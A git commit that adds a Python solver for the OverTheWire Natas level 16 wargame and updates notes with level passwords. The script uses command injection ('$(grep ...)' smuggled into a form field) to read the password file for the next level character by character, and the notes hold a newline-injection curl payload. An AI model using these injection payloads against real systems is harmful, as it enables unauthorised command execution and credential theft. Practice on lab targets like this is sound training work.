64792a8d8c0798e0bc924ae8ac48da31d71c2151
simba0x41 <simba0x41@gmail.com>
2020-12-07 00:56:33 -0500

    level 16 ok

---
+++ overthewire.org/natas/level16.py
@@ -0,0 +1,27 @@
+#!/usr/bin/env python
+
+import requests
+import urllib
+import array
+import re
+
+USER = 'natas16'
+PASSWORD = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
+url = 'http://natas16.natas.labs.overthewire.org/'
+letters = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9"]
+
+i=0
+key=""
+while(i<32):
+    for l in letters:
+        r = requests.Session()
+        #session = r.get('http://natas11.natas.labs.overthewire.org/', auth=(USER, PASSWORD'))
+        response = r.post(url, data= {"needle":"passwords$(grep ^"+key+l+"  /etc/natas_webpass/natas17)"},auth=(USER, PASSWORD))
+
+        content = re.findall('<pre>\n(.*)\n</pre>',response.text)
+        if (content):
+            print ("[-] not found")
+        else:
+            key = key + l
+            print("[+] Letter " + l + " found. Key: " + str(key))
+    i=i+1
--- overthewire.org/natas/notes.md
+++ overthewire.org/natas/notes.md
@@ -58,5 +58,7 @@
 * WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 
 #### Level 17
-* curl -X GET "http://127.0.0.1/level16/?needle=%0Aid%0A"
+* 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+#### Level18
 
